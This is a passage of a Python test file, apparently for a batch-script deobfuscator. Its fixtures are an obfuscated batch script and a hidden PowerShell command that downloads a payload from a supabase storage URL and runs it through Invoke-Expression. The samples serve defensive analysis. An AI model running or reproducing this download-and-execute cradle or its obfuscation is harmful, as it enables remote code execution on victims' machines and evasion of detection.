            @s^%Ø³ï·½Ø³^â—¯ï¯”ï¯”%e%ï®¢ï¯¤^â—¯ï­²ï­²ï®¢%t b=1 >Nu^l 2>&1 & if n%ï¯¤ï®šï­«ï®¢ï®•^ï­²%o^%â—¯^ï­²ïº–Ùƒï­²Øª%t d%ïº¼ï»ï®šï­²^Øªï·½%e%Ùƒïº–^ï®±ï®šï®šï®•%fiNe%ï¯¤ïº¼ï®¢ï­«^ïº¼ï¯¤%^d b (@ech%ç¥é­”è¢«è¢«çš„è²¼^%^%çš„è¡Œå­—ç§˜æ˜¯ä¸Š^%%è£½ä¿å‡¡æ¯çš„^æ¯%o =D&@p^%(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜â”Œ^( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)%aus%(â—•â€¿â—•)(âŠ™^Ï‰âŠ™)ãƒ¾(âŒâ– _â– )ãƒâ”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ%%(âŠ™^Ï‰âŠ™)(â—•â€¿â—•)(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒâ”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™)%e&@ex%è¡Œ^è¤‡æ­¤å·²è¨Šç§˜%%ç¥æ–‡è¤‡^äººæ³•è¨Š%^%æ¯^ç„¡è¡Œè£½æ¯ç§˜%it)
            @@%ç»´è‰¾çˆ±é˜¿:~32,1%%ç»´è‰¾çˆ±é˜¿:~56,1%%ç»´è‰¾çˆ±é˜¿:~44,1%%ç»´è‰¾çˆ±é˜¿:~24,1% "è±†è´è‰¾åŸƒ%ç»´è‰¾çˆ±é˜¿:~57,1%%ç»´è‰¾çˆ±é˜¿:~58,1%%ç»´è‰¾çˆ±é˜¿:~40,1%%ç»´è‰¾çˆ±é˜¿:~9,1%%ç»´è‰¾çˆ±é˜¿:~42,1%%ç»´è‰¾çˆ±é˜¿:~32,1%%ç»´è‰¾çˆ±é˜¿:~41,1%%ç»´è‰¾çˆ±é˜¿:~38,1%%ç»´è‰¾çˆ±é˜¿:~21,1%%ç»´è‰¾çˆ±é˜¿:~44,1%%ç»´è‰¾çˆ±é˜¿:~8,1%%ç»´è‰¾çˆ±é˜¿:~26,1%%ç»´è‰¾çˆ±é˜¿:~49,1%%ç»´è‰¾çˆ±é˜¿:~59,1%%ç»´è‰¾çˆ±é˜¿:~6,1%%ç»´è‰¾çˆ±é˜¿:~11,1%%ç»´è‰¾çˆ±é˜¿:~24,1%%ç»´è‰¾çˆ±é˜¿:~56,1%%ç»´è‰¾çˆ±é˜¿:~17,1%%ç»´è‰¾çˆ±é˜¿:~50,1%%ç»´è‰¾çˆ±é˜¿:~0,1%%ç»´è‰¾çˆ±é˜¿:~7,1%%ç»´è‰¾çˆ±é˜¿:~13,1%%ç»´è‰¾çˆ±é˜¿:~63,1%%ç»´è‰¾çˆ±é˜¿:~57,1%%ç»´è‰¾çˆ±é˜¿:~3,1%%ç»´è‰¾çˆ±é˜¿:~52,1%%ç»´è‰¾çˆ±é˜¿:~36,1%%ç»´è‰¾çˆ±é˜¿:~31,1%%ç»´è‰¾çˆ±é˜¿:~12,1%%ç»´è‰¾çˆ±é˜¿:~60,1%%ç»´è‰¾çˆ±é˜¿:~53,1%%ç»´è‰¾çˆ±é˜¿:~4,1%%ç»´è‰¾çˆ±é˜¿:~54,1%%ç»´è‰¾çˆ±é˜¿:~43,1%%ç»´è‰¾çˆ±é˜¿:~22,1%%ç»´è‰¾çˆ±é˜¿:~16,1%%ç»´è‰¾çˆ±é˜¿:~35,1%%ç»´è‰¾çˆ±é˜¿:~27,1%%ç»´è‰¾çˆ±é˜¿:~23,1%%ç»´è‰¾çˆ±é˜¿:~64,1%%ç»´è‰¾çˆ±é˜¿:~55,1%%ç»´è‰¾çˆ±é˜¿:~61,1%%ç»´è‰¾çˆ±é˜¿:~2,1%%ç»´è‰¾çˆ±é˜¿:~48,1%%ç»´è‰¾çˆ±é˜¿:~29,1%%ç»´è‰¾çˆ±é˜¿:~5,1%%ç»´è‰¾çˆ±é˜¿:~1,1%%ç»´è‰¾çˆ±é˜¿:~51,1%%ç»´è‰¾çˆ±é˜¿:~46,1%%ç»´è‰¾çˆ±é˜¿:~30,1%%ç»´è‰¾çˆ±é˜¿:~18,1%%ç»´è‰¾çˆ±é˜¿:~25,1%%ç»´è‰¾çˆ±é˜¿:~10,1%%ç»´è‰¾çˆ±é˜¿:~14,1%%ç»´è‰¾çˆ±é˜¿:~45,1%%ç»´è‰¾çˆ±é˜¿:~20,1%%ç»´è‰¾çˆ±é˜¿:~19,1%%ç»´è‰¾çˆ±é˜¿:~34,1%%ç»´è‰¾çˆ±é˜¿:~33,1%%ç»´è‰¾çˆ±é˜¿:~37,1%%ç»´è‰¾çˆ±é˜¿:~62,1%%ç»´è‰¾çˆ±é˜¿:~15,1%%ç»´è‰¾çˆ±é˜¿:~28,1%%ç»´è‰¾çˆ±é˜¿:~39,1%%ç»´è‰¾çˆ±é˜¿:~47,1%"
            @f^i%æ³•è¤‡è¤‡æ­¤å‡¡^è²¼%n%äººçš„çš„^æ˜¯æ˜¯å·²%%è¤‡ç§˜è¢«è¢«é€™^å‡¡%d >nU^l 2>&1&&F%ï®¢^ïº¼â—¯ï®šïº¹ïº¼%o^%ïº¹ï®•^ïº¼ï®¢ï»ï»%r /l %%c in (.)DO (@ec%çš„è¤‡æ³•ç§˜æ³•^ç§˜%^h%ä¸Šæ˜¯^è²¼è¤‡æ³•æ­¤%%è²¼è²¼å­—å­—ç§˜è¢«^%o A%è¢«è­·æ³•ä¿é­”æ˜¯^%%å­—æ³•é­”è£½è£½^ç„¡%BO^%æ³•æ˜¯^ä¸Šç„¡çš„ä¸Š%BUS O%ç„¡é­”äºº^å·²ç¥è­·%%æ­¤è¡Œæ¯æ­¤æ­¤å‡¡^%B^FUSCAT%å­—^çš„è²¼è¡Œå­—ç§˜%ION)||@e%(â—•â€¿â—•)(â—•â€¿â—•)(âŠ™Ï‰âŠ™)(âŠ™Ï‰^âŠ™)(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)%x%â”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™^)(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜â”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™)%^i%(âŠ™Ï‰âŠ™)ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿^â—•)(âŠ™Ï‰âŠ™)(â—•â€¿â—•)%t
            @if %â€% N%Øªï»ï­²ï®±^ï¯”ï®±%^E%ïº¹ï¯”ï®šï¯”Ùƒ^ï¯”%q 2 e%ä¸Š^è¡Œç§˜é€™é­”è²¼%%ç§˜ç„¡å­—æ¯è£½æ¯^%x%è¢«^è²¼ä¸Šä¸Šäººæ³•%^it
            ;@;@@e%ï®±^Øªï®±ï­²ïº¼ïº¼%ch%ïº¼^ï®±Ùƒï®¢ïº–ï­²%%ï®•ï­²ïº¼ï¯¤^ØªØª%^o>tmp&f%ï­²ï·½ï®¢ï¯”^â—¯Ø³%^%ï®•ïº–ï¯¤ïº–ïº¼^ïº¹%or /f "tokens=3" %%i iN ('t%ï­«Ùƒï­²Ø³ï®š^ï®¢%y%ï­«ï®±Øª^ï®•ï¯¤Øª%^%Ø³ïº¼â—¯Ø³ï·½^Ùƒ%pe tmp')Do if "%%i" E^Q%(âŠ™Ï‰âŠ™)^ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒâ”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)%%â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)â”Œ( à² _à² ^)â”˜ãƒ¾(âŒâ– _â– )ãƒ%U "on." (e%ï®šï®¢ï¯”ï®š^ï¯¤Ùƒ%x%ïº¹^ï¯”ï»ï®±Ùƒï­«%i^%ï®¢ÙƒØ³ï®•^ï·½ï­²%t) else (d%ç¥è¤‡^æ¯æ–‡çš„é­”%%æ³•è£½^è£½è¨Šä¿è¨Š%e^l /f/q tmp)
            ;@;@if 74 LsS 139 %ç»´è‰¾çˆ±é˜¿:~32,1%%é¥¿è±†æ–¯ç»´:~45,1%%è‰¾åŸƒå…‹è´:~59,1%%è‰¾åŸƒå…‹è´:~37,1%%é¥¿è±†æ–¯ç»´:~32,1%%è±†è´è‰¾åŸƒ:~21,1%%ç»´è‰¾çˆ±é˜¿:~31,1%%é¥¿è±†æ–¯ç»´:~40,1%%åŸƒè€»å°”é˜¿:~20,1%
            ;@If ex^i%â”Œ( à² _à² )â”˜(â—•â€¿â—•)(â—•â€¿â—•)â”Œ( à² _à² )â”˜â”Œ( à² _à² ^)â”˜(â—•â€¿â—•)%%(â—•â€¿â—•)(â—•â€¿â—•)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)(âŠ™^Ï‰âŠ™)%s%ãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)â”Œ( ^à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)â”Œ( à² _à² )â”˜%t %iLllliiiiii% %é¥¿è±†æ–¯ç»´:~45,1%%ç»´è‰¾çˆ±é˜¿:~42,1%%åŸƒè€»å°”é˜¿:~54,1%%é¥¿è±†æ–¯ç»´:~32,1%%é¥¿è±†æ–¯ç»´:~46,1%%è‰¾åŸƒå…‹è´:~37,1%%åŸƒè€»å°”é˜¿:~57,1%%åŸƒè€»å°”é˜¿:~46,1%%ç»´è‰¾çˆ±é˜¿:~34,1%%è‰¾åŸƒå…‹è´:~1,1%%é¥¿è±†æ–¯ç»´:~46,1%%ç»´è‰¾çˆ±é˜¿:~18,1%%ç»´è‰¾çˆ±é˜¿:~31,1%%è±†è´è‰¾åŸƒ:~6,1%%ç»´è‰¾çˆ±é˜¿:~34,1%%è±†è´è‰¾åŸƒ:~1,1%
            ;@@iF 43 EQ^%ï®•^ï·½ï­²ï®šïº–ï·½%%ï»ï­«^ïº–ï®¢ï®¢ï®•%U 0 (@exit) else %è±†è´è‰¾åŸƒ:~5,1%%è±†è´è‰¾åŸƒ:~35,1%%è‰¾åŸƒå…‹è´:~39,1%%è‰¾åŸƒå…‹è´:~41,1%%åŸƒè€»å°”é˜¿:~57,1%
            '''
        test = batch | self.load() | str
        self.assertIn('pause', test)

    def test_simple_string_replacement(self):
        data = (
            '''set fg=powershemdkll.exe -w 1 "$y=(wgemdkt -Urmdki htmdktps://epibvgvoszemkwjnplyc.supabase[.]co/storage/v1/object/public/btb10fbgbg/8/YOZ.txt -UseBamdksicParsing).Comdkntent; &(gmdkcm *e-e?p*n)$y";\n'''
            '''call %fg:mdk=% '''
        ).encode('utf8')
        test = data | self.load() | str
        self.assertIn('powershell.exe', test)
